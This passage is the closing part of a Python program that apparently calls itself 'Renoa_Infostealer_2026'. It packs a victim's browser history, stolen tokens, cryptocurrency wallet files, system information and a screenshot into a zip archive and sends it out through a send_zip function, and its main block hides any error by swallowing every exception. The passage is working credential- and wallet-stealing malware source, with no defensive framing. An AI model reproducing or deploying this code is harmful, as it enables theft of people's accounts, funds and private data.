            safe = tag.replace("/", "_").replace(" ", "_")
            payloads[f"History/{safe}/history.txt"] = "\n".join(
                f"{h['url']} | {h['title']} | visits={h['visits']} | {h['last']}"
                for h in hist
            )

    if tokens:
        payloads["Tokens/tokens.txt"] = "\n".join(tokens)

    payloads.update(wallet_files)

    payloads["System/system_info.txt"] = sys_info
    payloads["Renoa_Infostealer_2026.txt"] = note

    shot = take_screenshot_bytes()
    if shot:
        payloads["System/screenshot.png"] = shot

    zip_data = build_zip_bytes(payloads)
    send_zip(zip_data)

if __name__ == "__main__":
    try:
        main()
    except Exception:
        pass
